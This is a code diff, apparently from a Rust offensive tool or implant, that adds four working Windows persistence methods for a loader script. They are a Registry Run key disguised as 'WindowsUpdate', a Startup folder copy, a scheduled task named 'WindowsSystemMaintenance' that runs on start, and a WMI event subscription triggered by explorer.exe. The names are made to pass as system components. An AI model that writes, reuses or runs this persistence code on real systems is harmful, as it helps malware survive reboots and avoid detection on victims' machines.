@@ -582,6 +582,129 @@ WantedBy=default.target
             description: format!("Windows Registry .reg file at {}", reg_path.display()),
         });
 
+        // 5. Windows Registry Run key (real registry write)
+        #[cfg(target_os = "windows")]
+        {
+            let reg_run_result = (|| -> Result<String, String> {
+                std::process::Command::new("reg")
+                    .args([
+                        "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        "/v", "WindowsUpdate",
+                        "/t", "REG_SZ",
+                        "/d", loader_script,
+                        "/f",
+                    ])
+                    .output()
+                    .map_err(|e| e.to_string())?;
+                Ok("HKCU\\...\\Run\\WindowsUpdate".into())
+            })();
+
+            results.push(PersistenceMechanism {
+                name: "windows_registry_run".into(),
+                path: reg_run_result.clone().unwrap_or_else(|e| e),
+                mechanism_type: "windows_registry".into(),
+                installed: reg_run_result.is_ok(),
+                description: format!("Registry Run key WindowsUpdate -> {}", loader_script),
+            });
+        }
+
+        // 6. Windows Startup Folder
+        #[cfg(target_os = "windows")]
+        {
+            let startup_result = (|| -> Result<String, String> {
+                let appdata = std::env::var("APPDATA")
+                    .map_err(|_| "%APPDATA% not set".to_string())?;
+                let startup_dir = PathBuf::from(&appdata)
+                    .join("Microsoft")
+                    .join("Windows")
+                    .join("Start Menu")
+                    .join("Programs")
+                    .join("Startup");
+                std::fs::create_dir_all(&startup_dir).map_err(|e| e.to_string())?;
+                let dest = startup_dir.join("WindowsUpdate.lnk");
+                std::fs::copy(loader_script, &dest).map_err(|e| e.to_string())?;
+                Ok(dest.to_string_lossy().to_string())
+            })();
+
+            results.push(PersistenceMechanism {
+                name: "windows_startup_folder".into(),
+                path: startup_result.clone().unwrap_or_else(|e| e),
+                mechanism_type: "startup_folder".into(),
+                installed: startup_result.is_ok(),
+                description: format!("Startup folder copy at %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk"),
+            });
+        }
+
+        // 7. Windows Scheduled Task
+        #[cfg(target_os = "windows")]
+        {
+            let schtask_result = (|| -> Result<String, String> {
+                std::process::Command::new("schtasks")
+                    .args([
+                        "/create",
+                        "/tn", "WindowsSystemMaintenance",
+                        "/tr", loader_script,
+                        "/sc", "onstart",
+                        "/f",
+                    ])
+                    .output()
+                    .map_err(|e| e.to_string())?;
+                Ok("WindowsSystemMaintenance".into())
+            })();
+
+            results.push(PersistenceMechanism {
+                name: "windows_scheduled_task".into(),
+                path: schtask_result.clone().unwrap_or_else(|e| e),
+                mechanism_type: "scheduled_task".into(),
+                installed: schtask_result.is_ok(),
+                description: format!("Scheduled task WindowsSystemMaintenance -> {}", loader_script),
+            });
+        }
+
+        // 8. Windows WMI Event Subscription
+        #[cfg(target_os = "windows")]
+        {
+            let wmi_result = (|| -> Result<String, String> {
+                let filter_ns = "root\\subscription";
+                let ns_arg = format!("/namespace:\\\\{}", filter_ns);
+
+                std::process::Command::new("wmic")
+                    .arg(&ns_arg)
+                    .args(["create", "CommandLineEventFilter",
+                        "Name=\"HiveEventFilter\"",
+                        "EventNamespace='root\\cimv2'",
+                        "Query='SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA \\\"Win32_Process\\\" AND TargetInstance.Name = \\\"explorer.exe\\\"'"])
+                    .output()
+                    .map_err(|e| e.to_string())?;
+
+                std::process::Command::new("wmic")
+                    .arg(&ns_arg)
+                    .args(["create", "CommandLineEventConsumer",
+                        "Name=\"HiveConsumer\"",
+                        &format!("CommandLineTemplate='{}'", loader_script)])
+                    .output()
+                    .map_err(|e| e.to_string())?;
+
+                std::process::Command::new("wmic")
+                    .arg(&ns_arg)
+                    .args(["create", "__FilterToConsumerBinding",
+                        "Filter=\"HiveEventFilter\"",
+                        "Consumer=\"HiveConsumer\""])
+                    .output()
+                    .map_err(|e| e.to_string())?;
+
+                Ok("WMI: HiveEventFilter -> HiveConsumer".into())
+            })();
+
+            results.push(PersistenceMechanism {
+                name: "windows_wmi_subscription".into(),
+                path: wmi_result.clone().unwrap_or_else(|e| e),
+                mechanism_type: "wmi".into(),
+                installed: wmi_result.is_ok(),
+                description: format!("WMI event subscription: HiveEventFilter triggers {}", loader_script),
+            });
+        }
+
         results
     }
 
